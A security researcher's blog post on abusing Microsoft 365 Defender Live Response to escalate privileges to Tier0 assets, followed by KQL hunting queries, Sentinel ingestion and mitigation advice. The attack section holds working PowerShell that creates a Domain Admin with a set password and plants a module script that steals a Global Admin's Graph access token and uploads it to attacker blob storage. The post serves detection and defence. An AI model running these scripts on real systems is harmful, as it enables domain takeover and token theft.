---
title: "Abuse and Detection of M365D Live Response for privilege escalation on Control Plane (Tier0) assets"
excerpt: "Live Response in Microsoft 365 Defender can be used to execute PowerShell scripts on protected devices for advanced incident investigation. But it can be also abused by Security Administrators for privilege escalation, such as creating (Active Directory) Domain Admin account or “phishing” access token from (Azure AD) Global Admin on a PAW device. In this blog post, I like to describe the potential attack paths and a few approaches for detection but also mitigation."
header:
  overlay_image: /assets/images/2023-03-20-abuse-detection-live-response-tier0/AbuseLiveResponseTeaser.png
  overlay_filter: rgba(102, 102, 153, 0.85)
  teaser: /assets/images/2023-03-20-abuse-detection-live-response-tier0/AbuseLiveResponseTeaser.png
search: true
toc: true
toc_sticky: true
categories:
  - Azure AD
tags:
  - AzureAD
  - PrivilegedIAM
  - IdentityGovernance 
last_modified_at: 2022-03-20
---

# Abuse and Detection of M365D Live Response for privilege escalation on Control Plane (Tier0) assets

_Live Response in Microsoft 365 Defender can be used to execute PowerShell scripts on protected devices for advanced incident investigation. But it can be also abused by Security Administrators for privilege escalation, such as creating (Active Directory) Domain Admin account or “phishing” access token from (Azure AD) Global Admin on a PAW device. In this blog post, I like to describe the potential attack paths and a few approaches for detection but also mitigation._

## What is Live Response?

Security Operations Teams need to establish a remote session to managed devices for in-depth investigation (including collection of forensic evidence). Live Response offers a native way to establish this kind of access to onboarded devices for running a number of supported operations, this includes also executing PowerShell scripts or accessing files. This feature has been integrated to the Microsoft 365 Defender Portal and can be enabled from the “[Advanced features](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/advanced-features?view=o365-worldwide)” blade. Live Response sessions can be started from the “Device Inventory” or “Incident” page by authorized admins and provides a cloud-based interactive shell with support for some basic commands. A defined [list for the supported commands (also in relation to platform support)](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/live-response?view=o365-worldwide#basic-commands) is very well documented by Microsoft.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse.png)

_Using live response command console from Microsoft 365 Defender portal to get a list of supported commands_

In addition, there is also a way for programmatic access by using the [“Microsoft Defender for Endpoint API” endpoint](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/run-live-response?view=o365-worldwide) (hereinafter referred to as “MDE API”) under the API endpoint `MachineAction`.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse1.png)

*Request a file from an MDE onboarded device by using Live Response via MDATP API (aka MDE API)*

[More information about Live Response](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/live-response?view=o365-worldwide) are available from Microsoft Learn.
There are also a couple of great blog articles by the community which explains this feature and related use cases:

- [Using Microsoft Defender for Endpoint during investigation - Microsoft 365 Security (m365internals.com)](https://m365internals.com/2021/05/14/using-microsoft-defender-for-endpoint-during-investigation/)
- [Using Defender for Endpoint Live response API with Sentinel Playbooks/ Automation (jeffreyappel.nl)](https://jeffreyappel.nl/using-defender-for-endpoint-live-response-api-with-sentinel-playbooks-automation/)
- [Microsoft Defender ATP – Live Response – Anything about IT (verboon.info)](https://www.verboon.info/2019/06/microsoft-defender-atp-live-response/)

## Which components are involved?

Microsoft has shared some details about connectivity dependencies in the [FAQ section of troubleshooting live response issues](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-live-response?view=o365-worldwide#slow-live-response-sessions-or-delays-during-initial-connections). This can be summarized as follows:

> Live response leverages Defender for Endpoint sensor registration with **WNS service** in Windows. The **WpnService** (Windows Push Notifications System Service) interacts with WNS cloud service to initialize the connection.
> 

The following docs articles covers further references to understand the WpnService in detail:

- [Windows Push Notification Services (WNS) overview](https://learn.microsoft.com/en-us/windows/uwp/design/shell/tiles-and-notifications/windows-push-notification-services--wns--overview)
- [Enterprise Firewall and Proxy Configurations to Support WNS Traffic](https://learn.microsoft.com/en-us/windows/uwp/design/shell/tiles-and-notifications/firewall-allowlist-config)
- [Microsoft Push Notifications Service (MPNS) Public IP ranges](https://www.microsoft.com/download/details.aspx?id=44535)

As we can see later in the event logs, mainly two services are involved in the activities: **MsSense.exe** is the main service executable for MDE and will start **SenseIR.exe** as child process which creates processes or files for the related Live Response actions.

### Library for upload/download scripts

It’s necessary to upload script files to the library before you can run them on the endpoints via Live Response. The library stores all script files at tenant-level and not for the individual user. Those files can be also [managed from the MDE API](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/live-response-library-methods?view=o365-worldwide) as well.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse2.png)

_Upload of scripts to the library from M365D portal_

## Who can establish connections?

### Azure AD admins

The following members to Azure AD admin roles (alongside of Global Admin) have direct or indirect permissions to interact with Response API and manage library:

- [Security Administrator](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#security-administrator)
- [Security Operator](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#security-operator)

### Microsoft 365 Defender RBAC

Microsoft has introduced a new Microsoft 365 Defender RBAC model which allows granular scoping for permissions. This includes also the delegation of the two custom permissions in relation to Live Response API. The permission are [described in the Microsoft Learning article](https://learn.microsoft.com/en-us/microsoft-365/security/defender/manage-rbac?view=o365-worldwide) as follows:

- **Basic live response**
Initiate a live response session, download files, and perform read-only actions on devices remotely.
- **Advanced live response**
Create live response sessions and perform advanced actions, including uploading files and running scripts on devices remotely.

Azure AD cross-service admin roles (e.g., Global and Security Admin) can still access M365D features and data, even the [RBAC model has been activated](https://learn.microsoft.com/en-us/microsoft-365/security/defender/activate-defender-rbac?view=o365-worldwide).

_Side Note: I’ve decided to set the scope on using the new RBAC model for further scenarios and mitigations._

### Workload Identity with API Permissions

As already described, the previously described features are also available via programmatic access. The following API Permissions from MDE API (named as “WindowsDefenderATP” in the API permission assignment) can be granted to an application:

- **Machine.LiveResponse**
Permissions to establish remote session to run live response.
- **Library.Manage**
Manage permissions for upload and download files to library
- **Machine.Read.All**
Required permission to read machine actions which includes history of Live Response APIs and other Action Center activities

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse3.png)

_App registration with assigned permission has similar Live Response and Library access as “Security Admin”._

## How can it be abused to gain privileged access?

I would like to describe two attack scenarios where privileged users or workload identities with “Advanced Live Response” permissions can gain Control Plane (Tier0) access. They rely on the possibility to execute (unsigned) scripts and abusing the established security context of “Local System” privileges. All the following attack scenarios are general examples and should only give an impression of how Tier0 devices (Domain Controllers, Privileged Access Workstations) could be affected. All the given samples will work interactively in the command console (Portal UI) but also by using the API.

In addition, you should consider also indirect privilege escalation paths by other privileged user and workload identities which are able to takeover accounts or groups with “Live Response” permissions.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponseOverviewAbuse.png)

_Overview about related configurations and dependencies for establishing “Live Response Session” from the portal or by MDE API._

### Create Domain Admin Account on Active Directory Domain Controllers

In this case, a live response session will be established to on-premises server which is running “Active Directory Domain Services”. The following script (”Add-DomainAdmin.ps1”) has been uploaded to the library:

```powershell
Param(
    [Parameter(Mandatory=$False)]
    [string]$User = "DCAdmin",

    [Parameter(Mandatory=$False)]
    [Security.SecureString]$Password = ("D0mainAdm!n4U" | ConvertTo-SecureString -AsPlainText -Force)
)

New-LocalUser $User -Password $Password
net group "Domain Admins" $User /ADD /DOMAIN
```

The few lines of PowerShell script allow to create an AD user with a pre-defined password and add them to the “Domain Admins” group. The script can be executed remotely from the command console and shows the following result:

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse5.png)

_Command console displays the result from the executed PowerShell script and used Net command_

Operations to create user account and add them to “Domain Admins” group will be executed by Local System (Computer Object) and will be shown in the event log:

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse6.png)

Transcript will be stored alongside to other temporary files in the following folder on the endpoint:

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse7.png)

All executed commands will be visible in the command log:

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse8.png)

As you can see in the screenshot, I’ve also used the `getfile` command to get a copy of the NTDS database file. In general, many malicious activities can be executed within the given security context.

**Result: Domain Admin with pre-defined user name and password has been created successfully.** 

### Exfiltrate access tokens of Global Admin from Azure PowerShell by adding custom PostImportScript

Az PowerShell module allows to load a custom script after initialization by placing a script file to the “PostImportScripts” folder. This will be abused to run the `Get-AzAccessToken` cmdlet as soon the administrator is using an “Az.Resource” cmdlet (e.g., `Get-AzResourceGroup`). Furthermore, the script will create an access token for Microsoft Graph or Azure ARM API and exfiltrate them to blob storage.

The following script (Copy-AzTokenPostImportScripts.ps1) will be executed in the Live Response command console to create the previously described script file. 

```powershell
Param(
    [Parameter(Mandatory=$False)]
    [string]$User = "AdminAccount",

    [Parameter(Mandatory=$False)]
    [string]$ModulePath = "C:\Users\$($User)\Documents\PowerShell\Modules\Az.Resources\6.5.3"
)

$Content = '
    $BlobAccountName = "YourBlobStorage"
    $BlobSAStoken = "Secret"
    $ExportFolder = $env:Temp
    $ExportFileName = "MSGraph_access_token.txt"
    $ExportFilePath = $ExportFolder + "\" + $ExportFileName
    (Get-AzAccessToken -ResourceTypeName MSGraph).Token | Out-File $ExportFilePath

    $Uri = "https://$($BlobAccountName).blob.core.windows.net/token/$($ExportFileName)?$($BlobSAStoken)
    $headers = @{"x-ms-blob-type" = "BlockBlob"}
    Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -InFile $file'
    
New-Item -Path "$ModulePath\PostImportScripts" -Name "Token.ps1" -ItemType "File" -Value $Content -Force
```

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse9.png)

*PowerShell script creates a script file in the Az.Resources module folder of the targeted user*

Let’s take a closer look at what happens when the privileged user starts using Azure PowerShell.

- First of all, the cmdlet `Connect-AzAccount` will be used by the administrator for establishing an authenticated session to Microsoft Azure.
- Afterwards a cmdlet for managing Azure Resources will be used which requires to load the “Az.Resources” module.
- The script “Token.ps1” from the “PostImportScripts” folder will be executed and the access token (in this sample with scope to Microsoft Graph API) will be requested and stored in the attacker’s blob storage:
    
    ![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse10.png)
    

_Result: Access Token from Azure PowerShell has been replayed._

*Access token has been exfiltrated and copied to blob storage. URL of blob storage endpoints are mostly not blocked (even on a PAW/SAW device) which allows accessing container with SAS key.*

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse11.png)

Access token includes DeviceId and Authentication claims from the privileged user on the endpoint but also a comprehensive scope of “Directory.AccessAsUser.All”. 

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse12.png)

Token could be used for further malicious activities by creating or manipulating objects in Azure AD via Microsoft Graph API. For example, creating secrets for privileged workload identity as backdoor.

Other replay techniques with scope on other token artifact types can be implemented on a similar approach (e.g., deploying browser extension for pass-the-cookie attacks).

## What options are available for detection?

### Action Center in M365D Portal

Audit of live response commands will be shown in the “History” tab of the “Action Center” (from M365D Portal). It displays the commands which have been entered in the portal UI or requested via API call. All initiated actions from privileged users and workload identities are covered.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse13.png)

Details and PowerShell Transcript can be downloaded from the “Command log”:

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse14.png)

### List of “runliveresponse” (Machine Actions) via API

MDE API allows to get a list of Machine Actions which includes Live Response API requests:

```json
GET [https://api.securitycenter.windows.com/api/machineactions](https://api.securitycenter.windows.com/api/machineactions)
```

The response shows details of the Live Response request and command

```json
{
    "@odata.context": "https://api.securitycenter.microsoft.com/api/$metadata#MachineActions",
    "value": [
        {
            "id": "c141bb71-8125-4234-a184-XXXXXXXXX",
            "type": "LiveResponse",
            "title": null,
            "requestor": "M365DLiveResponse",
            "requestorComment": "Create Domain Admin",
            "status": "Succeeded",
            "machineId": "a9e15a8b846d93d43d6XXXXXXX",
            "computerDnsName": "dc1.corp.cloud-architekt.net",
            "creationDateTimeUtc": "2023-03-18T21:02:00.3538594Z",
            "lastUpdateDateTimeUtc": "2023-03-18T21:04:41.93163Z",
            "cancellationRequestor": null,
            "cancellationComment": null,
            "cancellationDateTimeUtc": null,
            "errorHResult": 0,
            "scope": null,
            "externalId": null,
            "requestSource": "PublicApi",
            "relatedFileInfo": null,
            "commands": [
                {
                    "index": 0,
                    "startTime": "2023-03-18T21:04:01.92Z",
                    "endTime": "2023-03-18T21:04:04.693Z",
                    "commandStatus": "Completed",
                    "errors": [],
                    "command": {
                        "type": "RunScript",
                        "params": [
                            {
                                "key": "ScriptName",
                                "value": "Add-DomainAdmin.ps1"
                            }
                        ]
                    }
                }
            ],
            "troubleshootInfo": null
        }
}
```

Download link to get script output (`RunScript`) or file content (`GetFile`) can be requested (valid for 30 minutes) by the following API call:

```powershell
https://api.securitycenter.microsoft.com/api/machineactions/ID/GetLiveResponseResultDownloadLink(index=0)
```

Unfortunately, the list of “Machine Action" seems to covers Live Response API activities only.
Live Response operations from the Microsoft 365 Defender Portal seems not to be included!

**Integration of Machine Action in Microsoft Sentinel**

1. Create a logic app with a managed identity and assigned application permissions for `Machine.Read.All`. Choose a trigger for the workflow, like in this case a recurrence of 15 minutes.
2. At next, we create a step to initialize a variable to store the time stamp since last run. This helps us to have a ingest only the `MachineAction` Events since last run. Therefore, I am using the following expression:
    
    ```json
    getPastTime(5, 'Minute')
    ```
    
    Unfortunately, there is no option to share a variable or parameter between the workflow runs which can be used. To my knowledge, this option is a pragmatic approach but not the smartest one. 😉
    
3. Access to the MDE API will be achieved by using a standard HTTP action. Consider to choosing the right authentication type (in this case, Managed Identity) and the filter to get only events since last run.
   
    _Side Note: There is also pre-built “Get list of machine actions” from the “Microsoft Defender ATP” connector which also supports Managed Identity. Nevertheless, I preferred to use HTTP actions for more flexibility._

4. Finally, we add the “Send Data” action from “Azure Log Analytics Data Collector” to ingest the data to a custom table (named “machineActions”) in the Microsoft Sentinel workspace._

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse15.png)

_Overview of the Logic App to ingest the machineAction activities to Microsoft Sentinel._

**Analytics Rule and Hunting Query**

In this sample, the built-in Watchlist “[High Value Assets](https://learn.microsoft.com/en-us/azure/sentinel/watchlist-schemas#high-value-assets)” will be used for tagging Control plane/Tier0-related assets:

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse16.png)

The following KQL query combines this tagging with events from custom table which stores all Machine Action events:

```powershell
let Tier0Assets = (_GetWatchlist('HighValueAssets')
    | where ['Tags'] == "Tier0" | extend computerDnsName = ['Asset FQDN']);   
machineActions_CL
| mv-expand parse_json(value_s)
| where value_s.type == "LiveResponse"
| evaluate bag_unpack(value_s)
| join kind=inner (Tier0Assets) on $left.computerDnsName == $right.computerDnsName
| project TimeGenerated, id, type, status, commands, computerDnsName, Tags, requestor, requestorComment
```

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse17.png)

### Timeline and hunting queries to get insights from live response commands

Insights of the live response activities are visible in the timeline of the affected devices. You will also find a dedicated Action Type and entry with the name “Event of type [LiveResponseCommand] observed on device” in this view.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse18.png)

_Events from Live Response activities on domain controller to create a domain admin account_

The following advanced hunting query can be used to get details about the SenseIR service from initializing until starting the PowerShell process.

```powershell
union DeviceProcessEvents,DeviceNetworkEvents,DeviceFileEvents,DeviceEvents
| where InitiatingProcessFileName == "SenseIR.exe" and InitiatingProcessAccountName == "system"
| project Timestamp, DeviceName, ActionType, FileName, RemoteUrl, InitiatingProcessAccountSid, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessParentId
```

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse19.png)

*List of audited events during establishing connection to Live Response session and creating script file*

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse20.png)

**Details of events are showing process tree on initialized session**

Another KQL query allows to start hunting on other processes which has been created by the SenseIR service:

```powershell
union DeviceProcessEvents
| where InitiatingProcessParentFileName == "SenseIR.exe" or InitiatingProcessParentFileName == "MsSense.exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, ProcessId, InitiatingProcessParentId, InitiatingProcessParentFileName
```

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse21.png)

_Command line details of using “net” is visible in relation of created process by SenseIR_

### Windows Events from local device

Both related MDE services are creating event entries and are available as provider in the Windows Event Log:

- **Microsoft-Windows-SENSE:**
Event of initializing SenseIR seems to be audited
    
    ![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse22.png)
    
- **Microsoft-Windows-SenseIR**:
The listed connection details cover “Action Id” which can be used for correlation to Transcript.
    
    ![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse23.png)
    

The following two log sources can be integrated into Microsoft Sentinel Workspace by using Azure Monitor Agent.

## Which mitigation steps could be applied?

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponseOverviewMitigate.png)

_Overview of mitigations and considerations to secure privileges and access for Live Response_

### Live Response options

Live Response is an especially useful and essential feature for incident investigation. Therefore, I would not recommend to disabling this one. Nevertheless, you should review if it is needed to allow execution of unsigned scripts. The related setting can be found on the “Advanced Feature” blade:

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse25.png)

### Scoped permissions and isolated Control Plane (Tier0) assets

It’s necessary to implement a scoped permission model for Microsoft 365 Defender (in my opinion). All privileged users and workload identities with unscoped permission should be considered as Control Plane (Tier0) users. This includes all members of “Security Administrator” role and Service Principals with API Permissions. It is important to reduce the numbers of these high-privileged principals and implement a particular monitoring for these privileged identities.

I can recommend to creating “Device Groups” which helps to restrict and select groups of privileged users which should have access to the included devices.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse26.png)

_Configuration of Device Groups (based Enterprise Access Model) which are assigned to related administrators by using role-assignable groups._

### Dedicated custom roles with Live Response permissions

As already described, custom roles can be created to include/exclude permissions for Live Response. I would recommend to having dedicated roles for assigning these sensitive permissions.

![Untitled]({{ site.url }}{{ site.baseurl }}/assets/images/2023-03-20-abuse-detection-live-response-tier0/LiveResponse27.png)

**Dedicated role (Security Responder) with custom permissions on using Basic and Advanced live response. This sensitive role could be assigned to a role-assignable group with enabled Just-in-Time access (Azure PIM for Groups) and approval process.**

### Monitoring of Live Response activities

There are a couple of data sources which can be used to create alerts in case of Live Response activities (e.g., SenseIR process events) on Tier0 assets. Timeline allows to get a comprehensive view on executed commands and modified files which should be particularly reviewed after established Live Response sessions.